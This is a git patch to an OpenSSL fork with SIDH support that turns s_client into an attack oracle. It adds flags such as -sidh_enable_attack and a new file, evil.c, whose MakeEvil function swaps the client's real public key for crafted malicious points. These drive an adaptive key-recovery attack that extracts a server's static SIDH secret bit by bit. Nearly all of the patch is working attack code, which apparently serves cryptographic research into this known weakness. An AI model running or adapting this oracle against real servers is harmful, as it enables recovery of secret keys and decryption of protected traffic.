@@ -1,0 +1,239 @@
+From b0f86a124e3beb3397625f3876fff2399cb42870 Mon Sep 17 00:00:00 2001
+From: Colin Stanfill <colin.stanfill@gmail.com>
+Date: Mon, 20 Feb 2017 15:27:09 -0500
+Subject: [PATCH] Adapt s_client into an oracle
+
+Controllable by command line params
+---
+ apps/s_client.c            |  21 +++++++
+ crypto/sidh/Makefile       |   2 +-
+ crypto/sidh/sidhkex_key.c  |   7 ++-
+ crypto/sidh/sidhlib/evil.c | 140 +++++++++++++++++++++++++++++++++++++++++++++
+ 4 files changed, 168 insertions(+), 2 deletions(-)
+ create mode 100644 crypto/sidh/sidhlib/evil.c
+
+diff --git a/apps/s_client.c b/apps/s_client.c
+index 3cabfb5..48df16e 100644
+--- a/apps/s_client.c
++++ b/apps/s_client.c
+@@ -204,6 +204,11 @@ extern int verify_error;
+ extern int verify_return_error;
+ extern int verify_quiet;
+ 
++extern uint64_t     sidh_attack_enabled;
++extern uint64_t     sidh_attack_bits_known;
++extern char         sidh_attack_known_order[6*8];
++extern uint64_t     sidh_attack_set_bit;
++
+ #ifdef FIONBIO
+ static int c_nbio = 0;
+ #endif
+@@ -1136,6 +1141,22 @@ int MAIN(int argc, char **argv)
+             keymatexportlen = atoi(*(++argv));
+             if (keymatexportlen == 0)
+                 goto bad;
++        } else if (strcmp(*argv, "-sidh_enable_attack") == 0) {
++            sidh_attack_enabled = 1;
++        } else if (strcmp(*argv, "-sidh_known_order") == 0) {
++            if (--argc < 1)
++                goto bad;
++            unsigned int n;
++            const char *known_order = *(++argv);
++            for (n = 0; n < 372 / 8; ++n) {
++                sscanf(known_order + 2 * n, "%2hhx", &sidh_attack_known_order[n]);
++            }
++        } else if (strcmp(*argv, "-sidh_known_bits") == 0) {
++            if (--argc < 1)
++                goto bad;
++            sidh_attack_bits_known = atoi(*(++argv));
++        } else if (strcmp(*argv, "-sidh_try_set_bit") == 0) {
++            sidh_attack_set_bit = 1;
+         } else {
+             BIO_printf(bio_err, "unknown option %s\n", *argv);
+             badop = 1;
+diff --git a/crypto/sidh/Makefile b/crypto/sidh/Makefile
+index 7afa6d9..3dbf5bd 100644
+--- a/crypto/sidh/Makefile
++++ b/crypto/sidh/Makefile
+@@ -108,6 +108,6 @@ sidhkex_key.o: ../../include/openssl/safestack.h ../../include/openssl/sidh.h
+ sidhkex_key.o: ../../include/openssl/stack.h ../../include/openssl/symhacks.h
+ sidhkex_key.o: sidhkex_key.c sidhkex_locl.h sidhlib/SIDH.c sidhlib/SIDH.h
+ sidhkex_key.o: sidhlib/SIDH_internal.h sidhlib/SIDH_setup.c
+-sidhkex_key.o: sidhlib/ec_isogeny.c sidhlib/fpx.c
++sidhkex_key.o: sidhlib/ec_isogeny.c sidhlib/evil.c sidhlib/fpx.c
+ sidhkex_key.o: sidhlib/generic/../SIDH_internal.h sidhlib/generic/fp_generic.c
+ sidhkex_key.o: sidhlib/kex.c sidhlib/validate.c
+diff --git a/crypto/sidh/sidhkex_key.c b/crypto/sidh/sidhkex_key.c
+index 407e62d..e2634bf 100644
+--- a/crypto/sidh/sidhkex_key.c
++++ b/crypto/sidh/sidhkex_key.c
+@@ -8,6 +8,7 @@
+ #include "sidhlib/SIDH.c"
+ #include "sidhlib/SIDH_setup.c"
+ #include "sidhlib/validate.c"
++#include "sidhlib/evil.c"
+ #ifdef SIDH_ASM
+ #include "sidhlib/AMD64/fp_x64.c"
+ #else
+@@ -289,7 +290,11 @@ int i2o_SIDH_PUB(SIDH_PUB *pub, unsigned char **out) {
+     }
+     new_buffer = 1;
+   }
+-  memcpy(*out, pub->pubKey, buf_len);
++  if (!sidh_attack_enabled) {
++      memcpy(*out, pub->pubKey, buf_len);
++  } else {
++      MakeEvil(pub->pubKey, *out);
++  }
+   if (!new_buffer) {
+     *out += buf_len;
+   }
+diff --git a/crypto/sidh/sidhlib/evil.c b/crypto/sidh/sidhlib/evil.c
+new file mode 100644
+index 0000000..2282d78
+--- /dev/null
++++ b/crypto/sidh/sidhlib/evil.c
+@@ -0,0 +1,140 @@
++#include "SIDH.h"
++#include "SIDH_internal.h"
++#include <memory.h>
++
++void ladder2(f2elm_t x, digit_t* m, point_proj_t P, point_proj_t Q, f2elm_t A, unsigned int order_bits, unsigned int order_fullbits, PCurveIsogenyStruct CurveIsogeny)
++{ // The Montgomery ladder
++  // Inputs: the affine quadratic x-coordinate of a point P on E: B*y^2=x^3+A*x^2+x,
++  //         scalar m
++  //         curve constant A24 = (A+2)/4
++  //         order_bits = subgroup order bitlength
++  //         order_fullbits = smallest multiple of 32 larger than the order bitlength
++  // Output: P = m*(x:1)
++  // CurveIsogeny must be set up in advance using SIDH_curve_initialize().
++    unsigned int bit = 0, owords = NBITS_TO_NWORDS(order_fullbits);
++    digit_t mask;
++    int i;
++    f2elm_t A24, constant, A24num;
++
++    // Initializing with the points (1:0) and (x:1)
++    fp2zero751(P->X);
++    fpcopy751((digit_t*)CurveIsogeny->Montgomery_one, (digit_t*)P->X[0]);
++    fp2zero751(P->Z);
++
++    fp2copy751(x, Q->X);
++    fp2zero751(Q->Z);
++    fpcopy751((digit_t*)CurveIsogeny->Montgomery_one, (digit_t*)Q->Z[0]);
++
++    fp2zero751(constant);
++    fpcopy751((digit_t*)CurveIsogeny->Montgomery_one, constant[0]);
++    fp2add751(constant, constant, constant);
++    fp2add751(A, constant, A24num);
++    fp2div2_751(A24num, A24);
++    fp2div2_751(A24, A24);
++
++    for (i = order_fullbits-order_bits; i > 0; i--) {
++        mp_shiftl1(m, owords);
++    }
++
++    for (i = order_bits; i > 0; i--) {
++        bit = (unsigned int)(m[owords-1] >> (RADIX-1));
++        mp_shiftl1(m, owords);
++        mask = 0-(digit_t)bit;
++
++        swap_points(P, Q, mask);
++        xDBLADD(P, Q, x, A24);           // If bit=0 then P <- 2*P and Q <- P+Q,
++        swap_points(P, Q, mask);         // else if bit=1 then Q <- 2*Q and P <- P+Q
++    }
++}
++
++void norm_proj(point_proj_t A, f2elm_t x) {
++    fp2copy751(A->Z, x);
++    fp2inv751_mont(x);
++    fp2mul751_mont(A->X, x, x);
++}
++
++uint64_t     sidh_attack_enabled = 0;
++uint64_t     sidh_attack_bits_known = 0;
++uint64_t     sidh_attack_set_bit = 0;
++digit_t      sidh_attack_known_order[6] = {0, 0, 0, 0, 0, 0};
++
++CRYPTO_STATUS MakeEvil(unsigned char* B, unsigned char* EvilB) {
++	PCurveIsogenyStruct CurveIsogeny = SIDH_curve_allocate(&CurveIsogeny_SIDHp751);
++	if (CurveIsogeny == NULL) {
++        return CRYPTO_ERROR;
++	}
++	if (SIDH_curve_initialize(CurveIsogeny, &CurveIsogeny_SIDHp751) != CRYPTO_SUCCESS) {
++        return CRYPTO_ERROR;
++    }
++    f2elm_t xP, xQ, xPQ;
++    to_fp2mont(((f2elm_t*)B)[0], xP);
++    to_fp2mont(((f2elm_t*)B)[1], xQ);
++    to_fp2mont(((f2elm_t*)B)[2], xPQ);
++
++    // Get the Montgomery A parameter. xDBLe wants it in A/C form.
++    f2elm_t A, C;
++    get_A(xP, xQ, xPQ, A, CurveIsogeny);
++    fpcopy751(CurveIsogeny->Montgomery_one, C[0]);
++    fpzero751(C[1]);
++
++    point_proj_t phiP;
++    fp2copy751(xP, phiP->X);
++    fp2zero751(phiP->Z);
++    fpcopy751(CurveIsogeny->Montgomery_one, phiP->Z[0]);
++
++    point_proj_t phiQ;
++    fp2copy751(xQ, phiQ->X);
++    fp2zero751(phiQ->Z);
++    fpcopy751(CurveIsogeny->Montgomery_one, phiQ->Z[0]);
++
++    point_proj_t phiD;
++    fp2copy751(xPQ, phiD->X);
++    fp2zero751(phiD->Z);
++    fpcopy751(CurveIsogeny->Montgomery_one, phiD->Z[0]);
++
++    // Generating the key (P+[n]Q, [m]Q, P+[n-m]Q).
++    // Here m = 1+2^k, n = -(sidh_attack_known_order_bits << k))
++    unsigned int high_digit = 370 - sidh_attack_bits_known;
++    digit_t PCoeff1[MAXWORDS_ORDER];  // n
++    digit_t PCoeff2[MAXWORDS_ORDER];  // m
++    digit_t PCoeff3[MAXWORDS_ORDER];  // n-m
++    digit_t Zero[MAXWORDS_ORDER];
++    memset(PCoeff1, 0, MAXWORDS_ORDER * 8);
++    memset(PCoeff2, 0, MAXWORDS_ORDER * 8);
++    memset(PCoeff3, 0, MAXWORDS_ORDER * 8);
++    memset(Zero, 0, MAXWORDS_ORDER * 8);
++
++    PCoeff2[high_digit / 64] |= 1LL << (high_digit % 64);
++    PCoeff2[0] |= 1;
++
++    unsigned int i;
++    mp_add(sidh_attack_known_order, PCoeff1, PCoeff1, MAXWORDS_ORDER);
++    if (sidh_attack_set_bit) {
++        PCoeff1[sidh_attack_bits_known / 64] |= 1LL << (sidh_attack_bits_known % 64);
++    }
++    for (i = 0; i < high_digit; ++i) {
++        mp_shiftl1(PCoeff1, MAXWORDS_ORDER);
++    }
++    // These subtractions may underflow, which is fine, we think.
++    mp_sub(Zero, PCoeff1, PCoeff1, MAXWORDS_ORDER);
++
++    mp_sub(PCoeff1, PCoeff2, PCoeff3, MAXWORDS_ORDER);
++
++    point_proj_t BadP, BadQ, BadD;
++    // BadP = P+[n]Q
++    ladder_3_pt(xP, xQ, xPQ, PCoeff1, ALICE, BadP, A, CurveIsogeny);
++    // BadQ = [m]Q
++    point_proj_t Scratch;
++    ladder2(xQ, PCoeff2, BadQ, Scratch, A, 372, CurveIsogeny->owordbits, CurveIsogeny);
++    // BadD = P+[n-m]Q
++    ladder_3_pt(xP, xQ, xPQ, PCoeff3, ALICE, BadD, A, CurveIsogeny);
++
++    f2elm_t BadxP, BadxQ, BadxPQ;
++    norm_proj(BadP, BadxP);
++    norm_proj(BadQ, BadxQ);
++    norm_proj(BadD, BadxPQ);
++    from_fp2mont(BadxP, ((f2elm_t*)EvilB)[0]);
++    from_fp2mont(BadxQ, ((f2elm_t*)EvilB)[1]);
++    from_fp2mont(BadxPQ, ((f2elm_t*)EvilB)[2]);
++    return CRYPTO_SUCCESS;
++}
+-- 
+2.1.4
+
